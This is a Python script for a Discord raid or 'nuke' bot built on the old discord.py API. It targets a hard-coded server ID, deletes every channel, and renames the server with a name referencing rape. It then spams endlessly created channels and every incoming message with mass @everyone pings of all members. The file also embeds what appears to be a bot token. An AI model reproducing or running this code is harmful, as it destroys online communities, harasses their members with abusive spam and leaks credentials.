import discord
import copy
import io
import pickle

bot = discord.Client()
bot.allmembers = ''

@bot.event
async def on_ready():
    print("Connected to API.")

    print('Setting bot profile details...')
    file = open('daddy.png', 'rb')
    await bot.edit_profile(username='Commander Squidward', avatar=file.read())
    print('bot profile details set!')

    print('Finding target guild...')
    guild = bot.get_guild('454058863600074753')
    print('Target guild found! (name="' + guild.name + '")')

    print('Fetching guild members...')
    for member in guild.members:
        bot.allmembers = bot.allmembers + member.mention
        print('Found guild member named ' + str(member) + ' with ID ' + member.id + '.')

    print("Deleting channels...")
    for channel in list(guild.channels):
        await bot.delete_channel(channel)
    print("Channels deleted!")

    print("Setting server name and details...")
    file = open('dance.png', 'rb')
    await bot.edit_guild(guild, name='Squidward\'s Rape Vault', icon=file.read())

    print("Creating channels and spamming...")
    channeladd = True
    while channeladd:
        try:
            newchannel = await bot.create_channel(guild, 'spam-time-muthafukas')
            await bot.send_message(newchannel, '@everyone\n' + bot.allmembers + '\nhttps://s22.postimg.cc/ty5xpjwpd/Squidward-_Dance_-_Copy_-_Copy_2.gif ```███████╗██████╗  █████╗ ███╗   ███╗██╗\n██╔════╝██╔══██╗██╔══██╗████╗ ████║██║\n███████╗██████╔╝███████║██╔████╔██║██║\n╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║╚═╝\n███████║██║     ██║  ██║██║ ╚═╝ ██║██╗\n╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝```')
        except:
            channeladd = False

@bot.event
async def on_message(message):
    await bot.send_message(message.channel, '@everyone\n' + bot.allmembers + '\nhttps://s22.postimg.cc/ty5xpjwpd/Squidward-_Dance_-_Copy_-_Copy_2.gif ```███████╗██████╗  █████╗ ███╗   ███╗██╗\n██╔════╝██╔══██╗██╔══██╗████╗ ████║██║\n███████╗██████╔╝███████║██╔████╔██║██║\n╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║╚═╝\n███████║██║     ██║  ██║██║ ╚═╝ ██║██╗\n╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝```')

bot.run('NDU1ODEzOTg3NTk1MTkwMjcy.DgBdXw.OTTAVjHcd4RQ7kVTm5bhtwcdElg')
